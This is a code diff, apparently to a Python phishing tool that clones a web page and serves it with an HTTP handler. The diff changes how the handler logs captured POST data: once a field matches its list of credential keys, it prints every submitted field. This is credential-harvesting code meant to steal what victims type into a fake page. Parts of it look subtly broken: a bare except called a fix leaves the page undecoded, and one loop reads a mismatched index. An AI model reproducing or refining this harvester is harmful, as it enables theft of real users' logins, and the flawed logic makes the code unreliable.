@@ -361,6 +361,9 @@ def download_url(url):
         html = html.decode('CP949','ignore')
     except UnicodeDecodeError:
         html = html.decode('UTF-8','ignore')
+    except:
+        # fixed bugs
+        html = html
     
     print("[!] Parsing the content...")
 
@@ -481,13 +484,38 @@ class handler(http.server.SimpleHTTPRequestHandler):
         form = form.split(" ")
           
         x = 0
+        
+        # update
+        # since i only shows the form with the credentials, is more intuitive to show ever post data.
+        # only do it if found an post with the same value in the dictionary, to avoid trash on the log
+        
+        found_something = False
+        
         try:
             while x < len(form):
                 if form[x] != "":
                     if form[x] in references:
-                        print("\033[1;31m[*] {} => {}\033[m".format(form[x],form[x+1]))
+                        found_something = True
+                        break
                     else:
                         pass
-                x = x+2
+                x = x+1           
         except:
             pass
+        
+        if found_something == True:
+            print("=======[ POST From Received ]=======")
+            try:
+                while x < len(form):
+                    if form[x] != "":
+                        if form[x] in references:
+                            print("\033[1;31m[*] {} => {}\033[m".format(form[x],form[x+1]))
+                        else:
+                            print("\033[1;30m[*] {} => {}\033[m".format(form[x],form[x+2]))
+                    x = x+2
+            except:
+                pass 
+            print("===================================")
+        else:
+            print("[+] No important data to show, skipping")
+            found_something =  False
